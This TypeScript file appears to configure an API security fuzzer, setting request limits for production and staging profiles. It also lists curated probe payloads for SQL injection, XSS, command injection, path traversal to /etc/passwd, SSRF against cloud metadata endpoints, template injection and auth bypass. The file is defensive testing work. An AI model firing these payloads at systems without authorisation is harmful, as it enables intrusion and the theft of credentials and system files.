/**
 * Centralized Fuzzing Configuration
 * FIX #3: All fuzzing-related constants in one place
 * NEW: Follow-on scenario limits and safety checks
 * NEW: prod_readonly profile limits for safe production testing
 */
export const FUZZING_CONFIG = {
  // Timeouts
  OUTER_TIMEOUT: 30000,        // Max total time for all scenarios (30s)
  SCENARIO_TIMEOUT: 5000,      // Max time per single scenario (5s)

  // Concurrency
  MAX_CONCURRENT_REQUESTS: 5,  // Max parallel fuzzing requests

  // Response handling
  MAX_BODY_PREVIEW: 500,       // Truncate response/request bodies at (bytes)
  MAX_HEADER_COUNT: 5,         // Max headers to show in evidence

  // Progress reporting
  PROGRESS_UPDATE_INTERVAL: 1, // Report progress every N scenarios

  // Follow-on scenario limits
  FOLLOW_ON: {
    MAX_SCENARIOS: 10,          // Max follow-on scenarios to generate
    MIN_SCENARIOS: 3,           // Min follow-on scenarios expected from GPT
    MIN_CRITICAL_ISSUES: 1,     // Min critical issues needed to trigger follow-on
    ALLOWED_SEVERITIES: ['critical', 'high'] as const, // Only these severities trigger follow-on
    MAX_RETRIES: 2,             // Max retries if follow-on generation fails
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // PROD_READONLY PROFILE LIMITS (safe for production testing)
  // ═══════════════════════════════════════════════════════════════════════════
  PROD_READONLY: {
    MAX_CONCURRENT_REQUESTS: 2,   // Very conservative concurrency
    MAX_TOTAL_REQUESTS: 20,       // Cap total fuzzing requests
    SCENARIO_TIMEOUT: 3000,       // Shorter timeout per request
    OUTER_TIMEOUT: 45000,         // Slightly longer overall timeout
    MAX_PAYLOAD_SIZE: 500,        // Limit payload size (bytes)
    DELAY_BETWEEN_REQUESTS_MS: 200, // Add delay to reduce load
    SKIP_TIME_BASED_PROBES: true, // No time-based SQLi etc.
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // NONPROD PROFILE LIMITS (more aggressive for staging/dev)
  // ═══════════════════════════════════════════════════════════════════════════
  NONPROD: {
    MAX_CONCURRENT_REQUESTS: 5,
    MAX_TOTAL_REQUESTS: 50,
    SCENARIO_TIMEOUT: 5000,
    OUTER_TIMEOUT: 60000,
    MAX_PAYLOAD_SIZE: 5000,
    DELAY_BETWEEN_REQUESTS_MS: 50,
    SKIP_TIME_BASED_PROBES: false,
  },
} as const;

export type FuzzingConfig = typeof FUZZING_CONFIG;

// ═══════════════════════════════════════════════════════════════════════════
// CURATED SECURITY PAYLOAD LIBRARY
// Safe, deterministic payloads for vulnerability detection
// ═══════════════════════════════════════════════════════════════════════════

/**
 * Curated SQL injection payloads (safe probes, no destructive queries)
 */
export const SQLI_PAYLOADS = [
  "' OR '1'='1",
  "1' OR '1'='1' --",
  "1; SELECT 1--",
  "1' AND '1'='1",
  "1 UNION SELECT NULL--",
  "1' AND SLEEP(0)--",  // Zero-delay, just syntax check
  "admin'--",
  "1/**/OR/**/1=1",
  "' OR ''='",
] as const;

/**
 * Curated XSS payloads (reflected probe detection)
 */
export const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><script>alert(1)</script>',
  "javascript:alert(1)",
  '<svg onload=alert(1)>',
  "'-alert(1)-'",
  '<body onload=alert(1)>',
  '{{constructor.constructor("alert(1)")()}}', // Template injection
] as const;

/**
 * Baseline reflected-XSS probe — the canonical payload other features inject
 * when they need ONE deterministic XSS string (e.g. negative test generation).
 * Named explicitly so reordering XSS_PAYLOADS can't silently change behavior.
 */
export const CANONICAL_XSS_PAYLOAD = '<script>alert(1)</script>';

/**
 * Curated command injection payloads (safe probes)
 */
export const COMMAND_INJECTION_PAYLOADS = [
  '; echo test',
  '| echo test',
  '`echo test`',
  '$(echo test)',
  '; id',
  '| id',
  '& echo test &',
  '\n/bin/echo test',
] as const;

/**
 * Curated path traversal payloads
 */
export const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\win.ini',
  '....//....//....//etc/passwd',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc/passwd',
  '/etc/passwd',
  'file:///etc/passwd',
] as const;

/**
 * Curated SSRF payloads (detection strings in parameters)
 */
export const SSRF_PAYLOADS = [
  'http://localhost:80',
  'http://127.0.0.1:80',
  'http://[::1]:80',
  'http://169.254.169.254/latest/meta-data/',  // AWS metadata
  'http://metadata.google.internal/',           // GCP metadata
  'http://0.0.0.0:80',
  'http://localtest.me',
] as const;

/**
 * Curated template injection payloads
 */
export const TEMPLATE_INJECTION_PAYLOADS = [
  '{{7*7}}',
  '${7*7}',
  '<%= 7*7 %>',
  '#{7*7}',
  '*{7*7}',
  '@(7*7)',
  '{{constructor.constructor("return 1")()}}',
] as const;

/**
 * Auth bypass header variations
 */
export const AUTH_BYPASS_HEADERS = [
  { name: 'No auth', headers: {} },
  { name: 'Empty Authorization', headers: { 'Authorization': '' } },
  { name: 'Invalid Bearer', headers: { 'Authorization': 'Bearer invalid_token_12345' } },
  { name: 'Malformed Bearer', headers: { 'Authorization': 'Bearer' } },
  { name: 'Wrong scheme', headers: { 'Authorization': 'Basic dGVzdDp0ZXN0' } },
  { name: 'Null byte', headers: { 'Authorization': 'Bearer \x00admin' } },
] as const;

/**
 * Get all curated payloads for a specific vulnerability type
 * @param type - Vulnerability type to get payloads for
 * @returns Array of payload strings
 */
export function getCuratedPayloads(type: 'sqli' | 'xss' | 'command_injection' | 'path_traversal' | 'ssrf' | 'template_injection'): readonly string[] {
  switch (type) {
    case 'sqli': return SQLI_PAYLOADS;
    case 'xss': return XSS_PAYLOADS;
    case 'command_injection': return COMMAND_INJECTION_PAYLOADS;
    case 'path_traversal': return PATH_TRAVERSAL_PAYLOADS;
    case 'ssrf': return SSRF_PAYLOADS;
    case 'template_injection': return TEMPLATE_INJECTION_PAYLOADS;
    default: return [];
  }
}

/**
 * Get profile-specific fuzzing limits
 * @param profile - Execution profile (prod_readonly or nonprod)
 * @returns Profile-specific configuration limits
 */
export function getProfileLimits(profile: 'prod_readonly' | 'nonprod') {
  return profile === 'prod_readonly' ? FUZZING_CONFIG.PROD_READONLY : FUZZING_CONFIG.NONPROD;
}
